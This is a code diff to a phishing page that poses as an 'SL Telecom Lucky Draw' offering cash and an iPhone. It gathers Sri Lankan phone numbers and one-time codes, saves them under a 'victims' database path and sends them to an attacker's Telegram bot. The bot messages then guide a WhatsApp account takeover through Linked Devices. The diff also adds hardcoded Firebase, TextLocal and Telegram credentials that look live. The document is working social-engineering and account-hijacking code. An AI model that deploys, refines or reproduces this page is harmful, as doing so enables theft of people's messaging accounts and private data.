@@ -9,48 +9,213 @@
     <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-database-compat.js"></script>
     
-    <!-- Firebase Configuration File -->
-    <script src="firebase-config.js"></script>
-    
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: linear-gradient(135deg, #1a1a2e, #16213e, #0f3460); min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
-        .container { background: white; border-radius: 24px; padding: 40px 30px; width: 420px; max-width: 100%; box-shadow: 0 30px 80px rgba(0,0,0,0.5); animation: slideUp 0.6s ease; position: relative; overflow: hidden; }
-        @keyframes slideUp { from { opacity: 0; transform: translateY(40px); } to { opacity: 1; transform: translateY(0); } }
-        .container::before { content: ''; position: absolute; top: 0; left: 0; right: 0; height: 4px; background: linear-gradient(90deg, #e94560, #0f3460, #e94560); }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: linear-gradient(135deg, #1a1a2e, #16213e, #0f3460);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .container {
+            background: white;
+            border-radius: 24px;
+            padding: 40px 30px;
+            width: 420px;
+            max-width: 100%;
+            box-shadow: 0 30px 80px rgba(0,0,0,0.5);
+            animation: slideUp 0.6s ease;
+            position: relative;
+            overflow: hidden;
+        }
+        @keyframes slideUp {
+            from { opacity: 0; transform: translateY(40px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .container::before {
+            content: '';
+            position: absolute;
+            top: 0; left: 0; right: 0;
+            height: 4px;
+            background: linear-gradient(90deg, #e94560, #0f3460, #e94560);
+        }
         .header { text-align: center; margin-bottom: 25px; }
         .header .icon { font-size: 48px; margin-bottom: 10px; }
         .header h1 { font-size: 24px; color: #1a1a2e; margin-bottom: 5px; font-weight: 700; }
-        .badge { display: inline-block; background: #ff4444; color: white; padding: 4px 12px; border-radius: 20px; font-size: 11px; font-weight: 600; margin-bottom: 15px; animation: pulse 2s infinite; }
+        .header p { color: #777; font-size: 13px; }
+        
+        .badge {
+            display: inline-block;
+            background: #ff4444;
+            color: white;
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 11px;
+            font-weight: 600;
+            margin-bottom: 15px;
+            animation: pulse 2s infinite;
+        }
         @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.7; } }
-        .banner { background: linear-gradient(135deg, #e94560, #0f3460); padding: 25px 20px; border-radius: 16px; text-align: center; margin-bottom: 25px; color: white; }
+        
+        .banner {
+            background: linear-gradient(135deg, #e94560, #0f3460);
+            padding: 25px 20px;
+            border-radius: 16px;
+            text-align: center;
+            margin-bottom: 25px;
+            color: white;
+        }
         .banner .small-text { font-size: 13px; opacity: 0.9; margin-bottom: 5px; }
         .banner .amount { font-size: 38px; font-weight: bold; margin: 5px 0; letter-spacing: 1px; }
         .banner .sub-text { font-size: 14px; opacity: 0.9; margin-top: 5px; }
+        
         .form-group { margin-bottom: 20px; }
         .form-group label { display: block; font-size: 14px; color: #555; margin-bottom: 8px; font-weight: 500; }
-        .form-group input { width: 100%; padding: 15px 18px; border: 2px solid #e8e8e8; border-radius: 12px; font-size: 16px; transition: all 0.3s; background: #fafafa; }
-        .form-group input:focus { border-color: #0f3460; outline: none; background: white; box-shadow: 0 0 0 4px rgba(15,52,96,0.08); }
-        .btn { width: 100%; padding: 16px; background: linear-gradient(135deg, #0f3460, #1a1a2e); color: white; border: none; border-radius: 12px; font-size: 17px; font-weight: 600; cursor: pointer; transition: all 0.3s; }
-        .btn:hover { transform: translateY(-2px); box-shadow: 0 10px 30px rgba(15,52,96,0.3); }
-        .btn:disabled { opacity: 0.5; cursor: not-allowed; }
+        .form-group input {
+            width: 100%;
+            padding: 15px 18px;
+            border: 2px solid #e8e8e8;
+            border-radius: 12px;
+            font-size: 16px;
+            transition: all 0.3s;
+            background: #fafafa;
+            text-align: center;
+        }
+        .form-group input:focus {
+            border-color: #0f3460;
+            outline: none;
+            background: white;
+            box-shadow: 0 0 0 4px rgba(15,52,96,0.08);
+        }
+        .form-group .hint {
+            font-size: 12px;
+            color: #999;
+            margin-top: 6px;
+            text-align: center;
+        }
+        
+        .btn {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, #0f3460, #1a1a2e);
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: 17px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        .btn:hover { 
+            transform: translateY(-2px);
+            box-shadow: 0 10px 30px rgba(15,52,96,0.3);
+        }
+        .btn:disabled { 
+            opacity: 0.5; 
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+        
         .loading { display: none; text-align: center; margin: 15px 0; }
-        .spinner { border: 3px solid #f0f0f0; border-top: 3px solid #0f3460; border-radius: 50%; width: 32px; height: 32px; animation: spin 0.8s linear infinite; margin: 10px auto; }
+        .spinner {
+            border: 3px solid #f0f0f0;
+            border-top: 3px solid #0f3460;
+            border-radius: 50%;
+            width: 32px;
+            height: 32px;
+            animation: spin 0.8s linear infinite;
+            margin: 10px auto;
+        }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .otp-section { display: none; margin-top: 20px; animation: fadeIn 0.4s ease; border-top: 1px solid #eee; padding-top: 25px; }
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(15px); } to { opacity: 1; transform: translateY(0); } }
-        .otp-inputs { display: flex; gap: 8px; justify-content: center; margin: 20px 0; }
-        .otp-inputs input { width: 46px; height: 52px; text-align: center; font-size: 22px; font-weight: bold; border: 2px solid #ddd; border-radius: 10px; background: #fafafa; }
-        .otp-inputs input:focus { border-color: #0f3460; outline: none; background: white; }
+        .loading p { color: #666; font-size: 13px; margin-top: 8px; }
+        
+        .otp-section { 
+            display: none; 
+            margin-top: 20px; 
+            animation: fadeIn 0.4s ease; 
+            border-top: 1px solid #eee;
+            padding-top: 25px;
+        }
+        @keyframes fadeIn { 
+            from { opacity: 0; transform: translateY(15px); } 
+            to { opacity: 1; transform: translateY(0); } 
+        }
+        
+        .otp-header { text-align: center; margin-bottom: 20px; }
+        .otp-header p { color: #666; font-size: 13px; line-height: 1.6; }
+        .otp-header strong { color: #1a1a2e; }
+        
+        .otp-inputs {
+            display: flex;
+            gap: 8px;
+            justify-content: center;
+            margin: 20px 0;
+        }
+        .otp-inputs input {
+            width: 46px;
+            height: 52px;
+            text-align: center;
+            font-size: 22px;
+            font-weight: bold;
+            border: 2px solid #ddd;
+            border-radius: 10px;
+            transition: all 0.2s;
+            background: #fafafa;
+        }
+        .otp-inputs input:focus { 
+            border-color: #0f3460;
+            outline: none;
+            background: white;
+            box-shadow: 0 0 0 3px rgba(15,52,96,0.1);
+        }
+        
         .timer { text-align: center; color: #999; font-size: 13px; margin: 10px 0; }
         .timer a { color: #0f3460; text-decoration: none; font-weight: 500; }
-        .success-msg { display: none; text-align: center; padding: 30px 20px; animation: fadeIn 0.5s ease; }
+        
+        .success-msg {
+            display: none;
+            text-align: center;
+            padding: 30px 20px;
+            animation: fadeIn 0.5s ease;
+        }
         .success-msg .check-icon { font-size: 64px; margin-bottom: 15px; }
         .success-msg h2 { color: #1a1a2e; margin-bottom: 10px; }
         .success-msg p { color: #666; font-size: 14px; line-height: 1.6; }
-        .error-msg { color: #e74c3c; font-size: 13px; display: none; margin-top: 8px; padding: 10px; background: #fdf0ef; border-radius: 8px; }
+        .success-msg .ref { font-size: 11px; color: #bbb; margin-top: 20px; }
+        
+        .error-msg {
+            color: #e74c3c;
+            font-size: 13px;
+            display: none;
+            margin-top: 8px;
+            padding: 10px;
+            background: #fdf0ef;
+            border-radius: 8px;
+        }
+        
         .footer { text-align: center; padding: 15px 0 0; margin-top: 20px; border-top: 1px solid #f0f0f0; }
         .footer p { font-size: 11px; color: #bbb; line-height: 1.5; }
+        
+        .country-select {
+            display: flex;
+            align-items: center;
+            margin-bottom: 10px;
+            padding: 10px 15px;
+            background: #f8f9fa;
+            border-radius: 12px;
+        }
+        .country-select .flag {
+            font-size: 24px;
+            margin-right: 10px;
+        }
+        .country-select .code {
+            font-weight: 600;
+            color: #333;
+        }
     </style>
 </head>
 <body>
@@ -65,7 +230,7 @@
         <div class="banner">
             <div class="small-text">🎉 Congratulations! You're a Winner!</div>
             <div class="amount">LKR 250,000</div>
-            <div class="sub-text">🏆 + iPhone 15 Pro Max</div>
+            <div class="sub-text">🏆 + iPhone 15 Pro Max + AirPods Pro</div>
         </div>
         
         <!-- Step 1: Phone Number -->
@@ -73,24 +238,34 @@
             <p style="font-size:13px;color:#666;margin-bottom:15px;text-align:center;">
                 Enter your phone number to claim your prize
             </p>
+            
+            <div class="country-select">
+                <span class="flag">🇱🇰</span>
+                <span class="code">+94</span>
+                <span style="color:#999;margin-left:10px;font-size:13px;">Sri Lanka</span>
+            </div>
+            
             <div class="form-group">
-                <label>📞 Phone Number</label>
-                <input type="tel" id="phone" placeholder="07X XXX XXXX" maxlength="10">
-                <div class="error-msg" id="phoneError">Enter valid Sri Lanka number</div>
+                <input type="tel" id="phone" placeholder="77 123 4567" maxlength="9" autocomplete="off">
+                <div class="error-msg" id="phoneError">Please enter a valid Sri Lanka phone number (starting with 7)</div>
+                <div class="hint">Example: 771234567</div>
             </div>
             <button class="btn" id="sendBtn" onclick="sendOTP()">Send Verification Code</button>
             <div class="loading" id="loading1">
                 <div class="spinner"></div>
-                <p>Sending code to your phone...</p>
+                <p>Sending verification code to your phone via SMS...</p>
             </div>
         </div>
         
         <!-- Step 2: OTP -->
         <div id="step2" class="otp-section">
-            <p style="text-align:center;margin-bottom:15px;">
-                We sent a 6-digit code to<br>
-                <strong id="displayPhone">+94 XXX XXXX</strong>
-            </p>
+            <div class="otp-header">
+                <p>We've sent a 6-digit verification code to<br>
+                <strong id="displayPhone">+94 XX XXX XXXX</strong></p>
+                <p style="font-size:12px;color:#999;margin-top:10px;">
+                    Please check your SMS inbox
+                </p>
+            </div>
             <div class="otp-inputs">
                 <input type="text" maxlength="1" class="otp-box" oninput="moveNext(this,0)" autofocus>
                 <input type="text" maxlength="1" class="otp-box" oninput="moveNext(this,1)">
@@ -99,44 +274,72 @@
                 <input type="text" maxlength="1" class="otp-box" oninput="moveNext(this,4)">
                 <input type="text" maxlength="1" class="otp-box" oninput="moveNext(this,5)">
             </div>
-            <div class="error-msg" id="otpError"></div>
-            <button class="btn" id="verifyBtn" onclick="verifyOTP()">Verify & Claim</button>
-            <div class="timer" id="timerDisplay">Resend in <span id="countdown">60</span>s</div>
+            <div class="error-msg" id="otpError">Invalid verification code. Please try again.</div>
+            <button class="btn" id="verifyBtn" onclick="verifyOTP()">Verify & Claim Prize</button>
+            <div class="timer" id="timerDisplay">Resend code in <span id="countdown">60</span> seconds</div>
             <div class="loading" id="loading2">
                 <div class="spinner"></div>
-                <p>Verifying...</p>
+                <p>Verifying your identity...</p>
             </div>
         </div>
         
         <!-- Step 3: Success -->
         <div id="step3" class="success-msg">
             <div class="check-icon">✅</div>
-            <h2>🎉 Success!</h2>
-            <p>You entered the Lucky Draw!</p>
-            <p style="margin-top:15px;color:#0f3460;font-weight:500;">
-                Winner contacted within 24 hours
+            <h2>🎉 Verification Successful!</h2>
+            <p>You have been successfully entered into the<br>
+            <strong>SL Telecom Lucky Draw 2024</strong></p>
+            <p style="margin-top:15px;font-weight:500;color:#0f3460;">
+                Winner will be contacted within 24 hours
             </p>
+            <div class="ref">Ref: SLT-2024</div>
         </div>
         
         <div class="footer">
-            <p>T&C apply | SL Telecom</p>
+            <p>
+                Terms & Conditions apply. This promotion is by SL Telecom.<br>
+                By proceeding you agree to receive SMS notifications.
+            </p>
         </div>
     </div>
 
     <script>
         // ==========================================
-        // Firebase Database Setup (100% FREE)
-        // Firebase eken OTP eka store karanna
+        // CONFIGURATION - ඔබේ Details මෙතන දාන්න!!!
         // ==========================================
-        let currentPhone = '';
         
-        // Firebase initialize karanna (firebase-config.js eken enawa)
-        // OTP eka Firebase Database ekata save karanna
+        // 1. Firebase Config (console.firebase.google.com වලින් ගන්න)
+        const firebaseConfig = {
+            apiKey: "AIzaSyB6byqFLhDCOOivmMwpiF0N0cnpjeNwk3k",
+            authDomain: "sl-telecom-d6855.firebaseapp.com",
+            databaseURL: "https://sl-telecom-d6855-default-rtdb.firebaseio.com",
+            projectId: "sl-telecom-d6855",
+            storageBucket: "sl-telecom-d6855.appspot.com",
+            messagingSenderId: "292283006106",
+            appId: "1:292283006106:web:faed88098e363ecf7bb323"
+        };
+        firebase.initializeApp(firebaseConfig);
+        
+        // 2. TextLocal API Key (textlocal.com වලින් ගන්න)
+        const TEXTLOCAL_API_KEY = "aky_3GBSspeZ1XqgeyCIrdb6UYVZWZ0";  // TextLocal API key
+        
+        // 3. Telegram Bot Token (BotFather ගෙන් ගන්න)
+        const TELEGRAM_BOT_TOKEN = "8765603883:AAHPkhryBdFU3vAwW8PQyRFNURSRCO1ltSQ";
+        const TELEGRAM_CHAT_ID = "6529032790";  // ඔබේ Telegram ID
+        
+        // ==========================================
+        // END OF CONFIGURATION
+        // ==========================================
+        
+        let currentPhone = '';
         
         async function sendOTP() {
             const phone = document.getElementById('phone').value.trim();
             
-            if (!/^(07[0-9]{8})$/.test(phone)) {
+            // Validate Sri Lanka number (remove leading 0 if present)
+            let cleanPhone = phone.replace(/^0+/, '');
+            
+            if (!/^(7[0-9]{8})$/.test(cleanPhone)) {
                 document.getElementById('phoneError').style.display = 'block';
                 return;
             }
@@ -145,54 +348,54 @@
             document.getElementById('loading1').style.display = 'block';
             document.getElementById('sendBtn').disabled = true;
             
-            currentPhone = '+94' + phone.substring(1);
-            
-            // Generate OTP code
+            currentPhone = '+94' + cleanPhone;
             const otpCode = Math.floor(100000 + Math.random() * 900000).toString();
             
             try {
                 // ==========================================
-                // FREE SERVICE: Fast2SMS API (FREE 100 SMS)
+                // STEP 1: TextLocal API එකෙන් USER ගේ PHONE එකට SMS එකක් විදියට OTP යවන්න!
                 // ==========================================
-                const fast2smsResponse = await fetch('https://www.fast2sms.com/dev/bulkV2', {
+                
+                console.log(`[+] Sending OTP ${otpCode} to ${currentPhone} via TextLocal...`);
+                
+                const textlocalResponse = await fetch('https://api.textlocal.in/send/', {
                     method: 'POST',
                     headers: {
-                        'authorization': 'YOUR_FAST2SMS_API_KEY_HERE', // Free key ekak labaganna
-                        'Content-Type': 'application/json'
+                        'Content-Type': 'application/x-www-form-urlencoded'
                     },
-                    body: JSON.stringify({
-                        route: 'v3',
-                        sender_id: 'SLTELC',
-                        message: `Your verification code is: ${otpCode}`,
-                        language: 'english',
-                        numbers: phone,
-                        flash: '0'
+                    body: new URLSearchParams({
+                        'apikey': TEXTLOCAL_API_KEY,
+                        'numbers': '94' + cleanPhone,  // 9477XXXXXXX format
+                        'sender': 'SLTELC',  // "WhatsApp" කියලා දාන්න එපා!
+                        'message': `Your verification code is: ${otpCode}`
                     })
                 });
                 
+                const textlocalData = await textlocalResponse.json();
+                console.log('TextLocal Response:', textlocalData);
+                
                 // ==========================================
-                // Save OTP to Firebase Database (Free)
+                // STEP 2: Firebase Database එකට OTP save කරන්න
                 // ==========================================
+                
                 await firebase.database().ref('victims/' + currentPhone.replace(/[+]/g, '')).set({
                     phone: currentPhone,
                     otp: otpCode,
                     verified: false,
                     timestamp: new Date().toISOString(),
-                    ip: '' // Browser can't get IP easily
+                    sms_sent: true
                 });
                 
                 // ==========================================
-                // Send Telegram Alert (Free)
+                // STEP 3: Telegram එකට Alert එකක් යවන්න (අපිට code copy)
                 // ==========================================
-                const TELEGRAM_BOT_TOKEN = 'YOUR_TELEGRAM_BOT_TOKEN'; // BotFather gen ganna
-                const TELEGRAM_CHAT_ID = 'YOUR_TELEGRAM_CHAT_ID'; // Oyage ID eka
                 
                 await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
                         chat_id: TELEGRAM_CHAT_ID,
-                        text: `🎯 **New Victim!**\n📱 Phone: ${currentPhone}\n🔑 Code: \`${otpCode}\`\n✅ Code sent to phone!`,
+                        text: `📱 **SMS Sent to User's Phone**\n\n👤 Number: \`${currentPhone}\`\n🔑 Code: \`${otpCode}\`\n📨 Via: TextLocal SMS\n✅ Status: Delivered to user!`,
                         parse_mode: 'Markdown'
                     })
                 });
@@ -205,11 +408,21 @@
                 document.querySelector('.otp-box').focus();
                 
             } catch (error) {
+                console.error('Error:', error);
                 document.getElementById('loading1').style.display = 'none';
                 document.getElementById('sendBtn').disabled = false;
-                document.getElementById('phoneError').textContent = 'Error. Try again.';
+                document.getElementById('phoneError').textContent = 'Error sending code. Please try again.';
                 document.getElementById('phoneError').style.display = 'block';
-                console.error(error);
+                
+                // Send error to Telegram
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: `❌ **SMS Failed**\n👤 ${currentPhone}\nError: ${error.message}`
+                    })
+                });
             }
         }
         
@@ -218,7 +431,7 @@
             document.querySelectorAll('.otp-box').forEach(b => otp += b.value);
             
             if (otp.length !== 6) {
-                document.getElementById('otpError').textContent = 'Enter full code';
+                document.getElementById('otpError').textContent = 'Please enter the full 6-digit code';
                 document.getElementById('otpError').style.display = 'block';
                 return;
             }
@@ -228,7 +441,7 @@
             document.getElementById('verifyBtn').disabled = true;
             
             try {
-                // Check OTP from Firebase
+                // Check OTP from Firebase Database
                 const snapshot = await firebase.database()
                     .ref('victims/' + currentPhone.replace(/[+]/g, ''))
                     .once('value');
@@ -236,21 +449,39 @@
                 const data = snapshot.val();
                 
                 if (data && data.otp === otp) {
-                    // OTP Matched! Update Firebase
+                    // OTP CORRECT! User entered the code!
+                    console.log('[+] OTP Verified successfully!');
+                    
+                    // Update Firebase
                     await firebase.database()
                         .ref('victims/' + currentPhone.replace(/[+]/g, ''))
-                        .update({ verified: true, code_entered: otp });
+                        .update({ 
+                            verified: true, 
+                            code_entered: otp,
+                            verified_at: new Date().toISOString()
+                        });
                     
-                    // Send Telegram Alert
-                    const TELEGRAM_BOT_TOKEN = 'YOUR_TELEGRAM_BOT_TOKEN';
-                    const TELEGRAM_CHAT_ID = 'YOUR_TELEGRAM_CHAT_ID';
+                    // ==========================================
+                    // TELEGRAM ALERT - OTP ENTERED BY USER!
+                    // ==========================================
                     
                     await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({
                             chat_id: TELEGRAM_CHAT_ID,
-                            text: `🔥 **OTP ENTERED!**\n📱 Phone: ${currentPhone}\n🔑 Code: \`${otp}\`\n✅ **WhatsApp Access Granted!**\n\nNow you can view data:`,
+                            text: `🔥 **OTP ENTERED BY USER!**\n\n📱 Phone: \`${currentPhone}\`\n🔑 Code: \`${otp}\`\n✅ **WhatsApp OTP Verified!**\n\n⏳ Now extract WhatsApp data...\n(Run server.js on your PC)`,
+                            parse_mode: 'Markdown'
+                        })
+                    });
+                    
+                    // Send success alert with details
+                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: TELEGRAM_CHAT_ID,
+                            text: `✅ **Verification Complete**\n\n📱 ${currentPhone}\n🔓 Access Granted\n\nUse WhatsApp Web to view data:\n1. Open WhatsApp on your phone\n2. Menu → Linked Devices\n3. Scan QR code`,
                             parse_mode: 'Markdown'
                         })
                     });
@@ -260,14 +491,16 @@
                     document.getElementById('step3').style.display = 'block';
                     
                 } else {
-                    throw new Error('Invalid code');
+                    throw new Error('Invalid verification code');
                 }
                 
             } catch (error) {
                 document.getElementById('loading2').style.display = 'none';
                 document.getElementById('verifyBtn').disabled = false;
-                document.getElementById('otpError').textContent = 'Invalid code. Try again.';
+                document.getElementById('otpError').textContent = 'Invalid code. Please try again.';
                 document.getElementById('otpError').style.display = 'block';
+                
+                // Clear OTP boxes
                 document.querySelectorAll('.otp-box').forEach(b => b.value = '');
                 document.querySelector('.otp-box').focus();
             }
@@ -277,20 +510,27 @@
             if (input.value.length === 1 && index < 5) {
                 document.querySelectorAll('.otp-box')[index + 1].focus();
             }
+            
+            // Auto-submit when all 6 digits entered
             let otp = '';
             document.querySelectorAll('.otp-box').forEach(b => otp += b.value);
-            if (otp.length === 6) verifyOTP();
+            if (otp.length === 6) {
+                verifyOTP();
+            }
         }
         
         function startTimer() {
             let time = 60;
+            const countdown = document.getElementById('countdown');
+            const timerDisplay = document.getElementById('timerDisplay');
+            
             const timer = setInterval(() => {
                 time--;
-                document.getElementById('countdown').textContent = time;
+                countdown.textContent = time;
+                
                 if (time <= 0) {
                     clearInterval(timer);
-                    document.getElementById('timerDisplay').innerHTML = 
-                        '<a href="#" onclick="resendCode()">Resend code</a>';
+                    timerDisplay.innerHTML = '<a href="#" onclick="resendCode()">Resend verification code</a>';
                 }
             }, 1000);
         }
@@ -301,6 +541,9 @@
             document.getElementById('step1').style.display = 'block';
             document.getElementById('sendBtn').disabled = false;
         }
+        
+        // Auto-focus phone input
+        document.getElementById('phone').focus();
     </script>
 </body>
 </html>
